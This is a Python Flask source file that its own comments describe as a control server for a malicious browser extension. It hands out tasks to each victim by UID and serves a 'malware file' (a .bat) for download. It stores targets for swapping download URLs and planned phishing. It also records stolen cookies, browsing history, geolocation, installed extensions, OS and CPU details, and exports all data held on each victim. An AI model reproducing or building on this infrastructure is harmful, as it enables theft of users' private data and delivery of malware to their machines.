
"""Structure of the comments:

The code will be divided by comments in sections. 
Those sections are: Testing, Non_Database_Logging, Communication_Server_Extension, Database
The first section as expected is for testing components of requests and how differents functions work.
Database section Manages all server logic of the database, that can be found in test.sqlite
Non_Database_logging is used in one of the snippets of code to log and understand the data recovered there

General comments Flask:
This is a local server build with flask that use a custom log package for storing the data
Flask for the creation of routes use the decorator @app.route(<route>), each of those is a new page/directory inside the server
Inside each route there is a function with the same name that the route (for comodity), the returns in those function
do a variaty of work. They could be what is expected to be shown in the webpage (an HTML) or the response to a POST or GET requests

Important to note that flask in the @app.route() also allow for (<route>/<type:variable>) syntax

General comments Sqlite:
Each time an operation wants to be realised inside the Sqlite database a connections has to be stablished
This is done by conn = sql.connect(PATH), then a cursos object has to be created that is 
cur = conn.cursor(). The attribute execute(str, values) can traslate the string str to a
query in SQL, the values used in the query have to be indicated with a ? in str and be giving
in the correct order of appearence in values.

Bibliography:
https://stackoverflow.com/questions/20646822/how-to-serve-static-files-in-flask 

How to start the Server:

First start an enviroment with flask, in my case:
conda activate servers

Then execute server with flask being PATH the path to app.py:

"""
#flask --app <relative or absolute path to this file> run
#importing the necessary libraries
import flask 
from flask import Flask,Response ,request, jsonify #The most used function from flask
import log
import os
import sqlite3 as sql
#creating an instance of the Flask class. This allows the flask library to now the name and file paths of the server
app = Flask(__name__,
            static_url_path='', 
            static_folder='Control/static',
            template_folder='Control/templates')

"""GLOBAL VARIABLES

DB_PATH = The path of the database
MAL_FILE = the name of the malware file in "/Server/Control/files/" to be send to a download request
"""

DB_PATH = __file__[:-6]+"DB\\DB.sqlite"
MAL_FILE = "prueba.bat"

"""TESTING SECTION

route("/") with function hello_world has not use outside of being the root route
route("/initialize") is used for cleaning and restarting any log file and DB
route("/control_server") is used has a default post web for testing purposes
"""

@app.route("/") #Root route for testing, not in use
def hello_world():
    
    return flask.render_template("home.html")

#Create or restart DB and all other logger file
@app.route("/initialize")
def initialize():
    create_database()
    return "Initialicing Database"

@app.route("/reset")
def reset():
    os.remove(DB_PATH)
    f = open(DB_PATH,"x")
    f.close()
    return flask.redirect(flask.url_for("initialize"), code=302)


#Default Post route 
@app.route('/control_server', methods=['POST'])
def control_server():
    print(request.get_json(force=True)) #Force any info recived to a json and print it in the console
                                        #Such that any Post can be reed and analize for future implementation
    return "thanks"


"""
COMMUNICATION_SERVER_EXTENSION
The routes in this section manages the information that the server could provide
to the extensions. That is:
Phase: Indicates the state of the download malware in the extension 0 = inactive; 1 = active
Targer_URL_Download: From which URL to download new payload
Objective_URL_Download: Which dowload URL to change with the new payload

WIP: 
Target_URL_Phising
Objective_URL_Phising
Delta_Sending_Data
Delta_Asking_Phase

Route "/req/<int:uid>" is used by the extension to Request information by presenting its UID
Route "/download" allow for a local file to be download by the extension to the user machine.
"""

@app.route("/req/<int:uid>", methods=['GET'])#The extension can request information by identifying itshelf with its UID
def req(uid):
    conn = sql.connect(DB_PATH) #Open database
    cur = conn.cursor()
    uid = [int(uid)]
    cur.execute("SELECT * FROM Users WHERE uid = ?",
                    (uid)) #Query all information in the correct Table
    rows = cur.fetchone() #UID is unique, so only one fetch is needed
    conn.close() #close connection
    if(rows == None): #If uid that is not in the database is used, return False, print in console information
        print("Not in Database: ", uid) 
        return "False"
    else: #If uid is in the database, give all information
        return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4], chi = rows[5], con = rows[6], par = rows[7])

@app.route('/download')
def downloadFile (): #extremly simple route for the extension to download a file
    path = __file__[:-6]+"Control\\files\\" + MAL_FILE
    return flask.send_file(path, as_attachment=True) #download file

#https://stackoverflow.com/questions/24577349/flask-download-a-file
    




"""
DATABASE LOGIC:

This functions and pages manages the creations, addition, edition and elimination 
logic of the database.

The database is a sqlite file in the /DB/ folder called test.sqlite, everything is 
managed by the sqlite python module.

This code is built from the basis presented in:
https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input

The logic make use of some html files present in /Control/templates/ for presenting a raw
UI to the attacker.

All Tables contains the uid of the victim.

create_database is used in the {URL}/initizalize page

route /list shows all UID, their phase and actual Objectives, Targets and File_Name
route /add allows for adding manually UID
route /extadd/<int:number> for the extesion to add information defined by the number
route /edit allows for manually editing main table (modify objectives, tarjets and file_name)
route /delete deletes wanted UID entry
route /alldata/<int:uid> Downlaods all information of a particular UID in a ordered .txt
"""


def create_database(): #The creation of the DATABASE, does not drop all information when restarted
    try:
        f = open(DB_PATH, "x")
        f.close()
    except:
        print("file already there")
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    #Users Table, store UID and general attack information, obj = Objective_URL_download, tar = Target_URL_Download, nam = Name_Download
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Users (
                    uid INTEGER PRIMARY KEY,
                    phase INTEGER,
                    downObj TEXT,
                    downTar TEXT,
                    downNam TEXT,
                    phiChild TEXT,
                    phiCont TEXT,
                    phiParent TEXT
                )                
                """)
    #ContentSettings Table, store the content settings of a possible victim by UID
    cur.execute("""
                CREATE TABLE IF NOT EXISTS ContentSettings (
                    automaticDownloads TEXT,
                    cookies TEXT,
                    images TEXT,
                    javaScript TEXT,
                    location TEXT,
                    plugins TEXT,
                    popups TEXT,
                    notifications TEXT,
                    fullScreen TEXT,
                    mouseLocks TEXT,
                    microphone TEXT,
                    camera TEXT,
                    unsandboxedPlugins TEXT,
                    csuid INTEGER,
                    FOREIGN KEY(csuid) REFERENCES Users(uid)
                    
                )

                """
    )
    #PrivacySettins Table, store privacy settings of a possible victim by UID
    cur.execute("""
                CREATE TABLE IF NOT EXISTS PrivacySettings (
                alternateErrorPagesEnabledVal TEXT,
                alternateErrorPagesEnabledLev TEXT,
                safeBrowsingEnabledVal TEXT,
                safeBrowsingEnabledLev TEXT,
                hyperlinkAuditingEnabledVal TEXT,
                hyperlinkAuditingEnabledLev TEXT,
                doNotTrackEnabledVal TEXT,
                doNotTrackEnabledLev TEXT,
                protectedContentEnabledVal TEXT,
                protectedContentEnabledLev TEXT,
                psuid INTEGER,
                FOREIGN KEY(psuid) REFERENCES Users(uid)


                )
    
    """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Cookies (
                    uid INTEGER ,
                    cookies TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Historial (
                    uid INTEGER ,
                    historie TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Downloads (
                    uid INTEGER ,
                    down TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Proxies (
                    uid INTEGER ,
                    proxy TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Extensions (
                    uid INTEGER ,
                    extension TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Geolocations (
                    uid INTEGER ,
                    latitude Real,
                    longitude Real,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Cpus (
                    uid INTEGER ,
                    cpu TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS OS (
                    uid INTEGER ,
                    os TEXT,
                    FOREIGN KEY(uid) REFERENCES Users(uid)
                )                
                """)
    conn.commit()
    
    conn.close()
    
@app.route('/list')
def list():
    #This will give a view of all UID store and their respective attack information
    #Also allows for edition and removing, such that Admin task can be done in the fly

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT * FROM  Users")
    rows = cur.fetchall()

    conn.close()

    return flask.render_template("list.html", rows=rows)



@app.route('/edit/<int:number>', methods=['GET', 'POST'])
def edit(number):
    #Edition formula for Users Table from route /list
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST': #the request information to be obtained from the edit html
        item_uid    = number
        item_phase = request.form['phase']
        item_obj  = request.form['obj']
        item_tar  = request.form['tar']
        item_nam  = request.form['nam']
        item_Chil = request.form["chi"]
        item_cont = request.form["con"]
        item_par  = request.form["par"]
    
        cur.execute("UPDATE Users SET phase = ?, downObj = ?, downTar = ?, downNam =?, phiChild = ?, phiCont =?, phiParent =? WHERE uid = ?",
                    (item_phase, item_obj,item_tar, item_nam, item_Chil, item_cont, item_par ,item_uid)) #updating values with new ones
        conn.commit()
        
        return flask.redirect('/list') #return to route "/list" to see changes done
            
    cur.execute("SELECT * FROM Users WHERE uid = ?", (number,))
    item = cur.fetchone()
    
    conn.close()

    return flask.render_template("edit.html", item=item)


@app.route('/delete/<int:number>')
def delete(number):
    #Delete route that is execute from list, WIP delete all information in all Tables
    #internal use only
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
        
    cur.execute("DELETE FROM Users WHERE uid = ?", (number,))

    conn.commit()
    
    conn.close()

    return flask.redirect('/list') 

@app.route('/add', methods=['GET', 'POST'])
def add():
    #adding route to manage from route "/list" used in testing purposes
    #Internal use only
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = request.form['uid']
        item_phase = request.form['phase'] #because this is for testing, there is no need to add inmediatly all atributes

        
        cur.execute("""INSERT INTO Users (uid, phase) VALUES (?, ?)""", 
                    (item_uid, item_phase))
        conn.commit()
        
        return flask.redirect('/list') 
        
    return flask.render_template("add.html")


@app.route("/extadd/<int:number>", methods=['POST'])
def extadd(number):
    '''
    This is the route for adding elements to the database for the extions
    the int number determines which Table to send the information
    The information is processed in the log.py module.
    Number dictionary:
    1 = Content Settings
    2 = Privacy Settings
    3 = Geolocation
    4 = Cookies
    5 = Historial
    6 = Downloads
    7 = Extensions
    8 = Cpu 
    9 = Proxie
    10 = OS
    Other = New User Register
    '''

    if (number == 1): 
        data = request.get_json(force=True)
        log.CSDBlog(data)
        pass
    elif (number == 2):
        data = request.get_json(force=True)
        log.PSDBlog(data)
        pass
    elif(number == 3):
        data = request.get_json(force=True)
        log.Geolocationslog(data)
    elif(number == 4):
        data = request.get_json(force=True)
        log.Cookieslog(data)
    elif(number == 5):
        data = request.get_json(force=True)
        log.HistorialLog(data)
    elif(number == 6):
        data = request.get_json(force=True)
        log.Downloadslog(data)
    elif(number == 7):
        data = request.get_json(force=True)
        log.Extensionslog(data)
    elif(number == 8):
        data = request.get_json(force=True)
        log.CPUlog(data)
    elif(number == 9):
        data = request.get_json(force=True)
        log.Proxielog(data)
    elif(number == 10):
        data = request.get_json(force=True)
        log.OSlog(data)
    else:
        if request.method == 'POST':
            conn = sql.connect(DB_PATH)
            cur = conn.cursor()
            item_uid    = int(request.get_json(force=True)["uid"][0])
            item_phase = 0
            #https://stackoverflow.com/questions/19337029/insert-if-not-exists-statement-in-sqlite
            cur.execute("""INSERT OR IGNORE INTO Users (uid, phase) VALUES (?, ?)""", 
                        (item_uid, item_phase))
            conn.commit()
        
    return "good day"

#Create by ChatGPT:

@app.route('/alldata/<int:uid>', methods=['GET'])
def get_data(uid):
    """
    For reading all the data from a user, instead of creating a view in HTML it was decided
    that it would be far more confortable to put it all together in a .txt file and read it from 
    there

    It simple connects to each Table, ask for the information in base of the uid and then
    put it all together separete by indents inside the txt file with the columns name
    such that it is more easy to read and understand the information given.
    """
    conn = sql.connect(DB_PATH)
    c = conn.cursor()

    data = {}

    # query table1
    c.execute('SELECT * FROM Users WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['UsersCol'] = col_names
    data['Users'] = c.fetchall()
    
    # query table2
    c.execute('SELECT * FROM ContentSettings WHERE csuid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['ContentSettingsCol'] = col_names
    data['ContentSettings'] = c.fetchall()

    # query table3
    c.execute('SELECT * FROM PrivacySettings WHERE psuid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['PrivacySettingsCol'] = col_names
    data['PrivacySettings'] = c.fetchall()

    # query table4
    c.execute('SELECT * FROM Cookies WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['CookiesCol'] = col_names
    data['Cookies'] = c.fetchall()

    # query table5
    c.execute('SELECT * FROM Cpus WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['CpusCol'] = col_names
    data['Cpus'] = c.fetchall()

    # query table6
    c.execute('SELECT * FROM Downloads WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['DownloadsCol'] = col_names
    data['Downloads'] = c.fetchall()

    # query table7
    c.execute('SELECT * FROM Extensions WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['ExtensionsCol'] = col_names
    data['Extensions'] = c.fetchall()

    # query table8
    c.execute('SELECT * FROM Geolocations WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['GeolocationsCol'] = col_names
    data['Geolocations'] = c.fetchall()

    # query table9
    c.execute('SELECT * FROM Historial WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['HistorialCol'] = col_names
    data['Historial'] = c.fetchall()

    # query table10
    c.execute('SELECT * FROM OS WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['OSCol'] = col_names
    data['OS'] = c.fetchall()

    # query table11
    c.execute('SELECT * FROM Proxies WHERE uid=?', (uid,))
    col_names = [description[0] for description in c.description]
    data['ProxiesCol'] = col_names
    data['Proxies'] = c.fetchall()


    # close the connection to the database
    conn.close()

    # create a response with the data
    str_data = ''
    i = 0
    for key, value in data.items():
        str_data += str(key) + ': ' + str(value) + '\n'
        if i ==1:
            str_data += '\n\n\n'
            i = 0
        else:
            i = 1
    response = Response(str_data, status=200, mimetype='text/plain')
    response.headers['Content-Disposition'] = 'attachment; filename=alldata.txt'

    return response